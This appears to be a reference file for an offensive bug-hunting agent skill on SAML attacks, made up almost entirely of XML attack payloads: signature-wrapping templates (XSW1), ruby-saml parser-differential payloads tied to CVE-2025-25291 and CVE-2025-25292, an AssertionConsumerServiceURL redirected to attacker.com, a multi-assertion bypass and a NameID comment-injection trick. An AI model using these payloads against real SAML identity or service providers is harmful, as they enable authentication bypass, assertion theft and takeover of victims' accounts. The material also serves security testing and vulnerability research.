---
name: saml-attacks
description: saml-attacks reference material.
---

# SAML Signature Wrapping & Parser Differentials

Part of `skills/hunt-oauth/SKILL.md`. Read this ONLY when the target is a SAML SP/IdP (`<samlp:AuthnRequest>`, `<saml:Assertion>`, ACS URL, `RelayState` observed) rather than plain OAuth2/OIDC.

---

### Sub-technique D — SAML signature wrapping primitives (XSW1 through XSW8 + ruby-saml class)

```xml
<!-- D.1 XSW1 — wrap original assertion, copy original signature -->
<samlp:Response>
  <saml:Assertion ID="evil"><Subject><NameID>attacker</NameID></Subject>
    <ds:Signature>...original ref to legit ID...</ds:Signature>
    <saml:Assertion ID="legit"><Subject><NameID>victim</NameID></Subject></saml:Assertion>
  </saml:Assertion>
</samlp:Response>

<!-- D.2 ruby-saml DOCTYPE parser differential (CVE-2025-25291, ahacker1 GHSL-2024-329) -->
<!DOCTYPE samlp:Response [
  <!ATTLIST saml:Assertion ID ID #IMPLIED>
  <!ENTITY x "data">
]>
<!-- REXML truncates ATTLIST and validates signature on assertion ID="real"; Nokogiri reads attacker-injected ID="evil" -->

<!-- D.3 ruby-saml namespace confusion (CVE-2025-25292, @p- GHSL-2024-330, PortSwigger SAML Roulette) -->
<samlp:Response xmlns:ds="evil-ns">
  <ds:Signature>...</ds:Signature>     <!-- Nokogiri reads under evil-ns -->
  <ds:Signature>...</ds:Signature>     <!-- REXML reads default-ns (signs original) -->
</samlp:Response>

<!-- D.4 ACS URL injection (Admidio GHSA-p9w9-87c8-m235) -->
<samlp:AuthnRequest AssertionConsumerServiceURL="https://attacker.com/acs" Destination="https://idp.target/sso">

<!-- D.5 OneUptime multi-assertion (GHSA-5w5c-766x-265g) -->
<saml:Assertion><Subject><NameID>attacker</NameID></Subject></saml:Assertion>     <!-- assertion[0] read by getEmail -->
<saml:Assertion ID="signed"><Signature>...</Signature><Subject><NameID>legit</NameID></Subject></saml:Assertion>

<!-- D.6 Comment injection in NameID (XSW classic — Cisco Duo et al historical) -->
<saml:NameID>attacker@target.com<!---->.victim@target.com</saml:NameID>           <!-- some parsers truncate at comment -->
```

